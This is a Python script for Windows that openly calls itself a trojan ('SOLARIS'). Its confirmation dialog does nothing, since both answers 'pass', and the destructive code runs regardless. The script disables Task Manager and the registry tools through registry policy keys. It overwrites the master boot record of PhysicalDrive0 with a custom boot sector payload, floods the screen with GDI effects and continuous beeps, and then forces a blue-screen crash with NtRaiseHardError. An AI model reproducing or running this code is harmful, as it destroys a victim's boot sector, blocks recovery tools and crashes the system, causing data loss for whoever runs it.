import tkinter as tk
from tkinter import messagebox

def confirm_solaris_execution():
    answer = messagebox.askquestion("Confirmation", "Are you sure you want to execute SOLARIS THIS IS MALWARE CODED BY MATTIA. I'M NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TROJAN (THIS MALWARE IS NO JOKE BY PRESSING YES YOUR PC WIL DEAD) ?")
    if answer == 'yes':
        # Start executing SOLARIS
        pass
    else:
        # Do something else or close the dialog
        pass

root = tk.Tk()
root.withdraw()  # Hide the main window

confirm_solaris_execution()

import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)
import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

import ctypes
import time
import random
import win32api
import win32con
import win32gui
import win32ui
import win32com.client
import pythoncom
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import win32gui
import win32api
import win32con
import random
import time
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import win32gui
import win32api
import win32con
import random
import time
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import os    
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
import win32api
from win32file import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import winsound
import ctypes
import threading
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import os
import subprocess
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
import win32api
from win32file import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import winsound
import ctypes
import threading
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import os
import subprocess
from PIL import ImageGrab
from win32file import *

data = bytes([0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xFF, 0x8E, 0xDF,
0xD9, 0x06, 0x7B, 0x7C, 0xBD, 0xC8, 0x00, 0xD9, 0x06, 0x7B, 0x7C, 0xBA, 0x40, 0x01, 0xD9, 0xEE,
0xD9, 0xEE, 0xB0, 0x64, 0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xE9, 0xD8, 0xC3,
0xD9, 0xC1, 0xD9, 0xC3, 0xDE, 0xC9, 0xDC, 0xC0, 0xD8, 0xC5, 0xDD, 0xDB, 0xDD, 0xD9, 0xD9, 0xC0,
0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xC1, 0xDF, 0x1E, 0x87, 0x7C, 0x83, 0x3E, 0x87, 0x7C,
0x04, 0x7D, 0x04, 0xFE, 0xC8, 0x75, 0xCD, 0xDD, 0xD8, 0xDD, 0xD8, 0x01, 0xF0, 0xAA, 0xD8, 0x06,
0x73, 0x7C, 0x4A, 0x75, 0xB9, 0xDD, 0xD8, 0xD8, 0x06, 0x77, 0x7C, 0x4D, 0x75, 0xA9, 0x46, 0xDD,
0xD8, 0xEB, 0x99, 0x9A, 0x99, 0x19, 0x3C, 0x8F, 0xC2, 0x75, 0x3C, 0x00, 0x00, 0xC0, 0xBF, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

])

for i in range(2):
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                            OPEN_EXISTING,
                         0, 0)
    WriteFile(hDevice, data , None)
    CloseHandle(hDevice)
    
    


desk = GetDC(0)
x = 100
y = 100
x_2 = 100
y_2 = 100


for i in range(5):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10
    
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        0, # Red value
        0, # Green value
        200 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(10) # Waits 10 milliseconds
    # Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT) # Makes a lot of stuff :)
    Sleep(10) # Waits 10 milliseconds
    # Library Import


desk = GetDC(0) # Get Primary Monitor
x = GetSystemMetrics(0) # Get monitor width
y = GetSystemMetrics(1) # Get monitor height
freq = 1000 # initial frequency in hertz


def tone(): # Defines the function "tone" which is responsible for the audio effects
    while True:
        global freq
        winsound.Beep(freq, 10000)
        freq = freq + 50
        if freq > 30000:
            freq = 1000
    
def shut(): # Defines the function "shut" which is responsible for the BSOD Triggering
    for n in range(0, 1):
        Sleep(20000)
        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint())
        )
        

def gdi(): # Defines the function "gdi" wich is responsible for the gdi effects
    while True:
        brush =  CreateSolidBrush(RGB(

            randrange(255),
            randrange(255),
            randrange(255),

        ))
        SelectObject(desk, brush)
        PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
        DeleteObject(brush)
        Sleep(5)
    ReleaseDC(desk, GetDesktopWindow())
    DeleteDC(desk)

p1 = threading.Thread(target=tone) # Placing the function "tone" in multitasking
p2 = threading.Thread(target=gdi) # Placing the function "gdi" in multitasking
p1.start() # Run the Function "tone"
p2.start() # Run the Function "gdi"


shut() # Triggers BSOD After 30 seconds

exit() # End the script execution
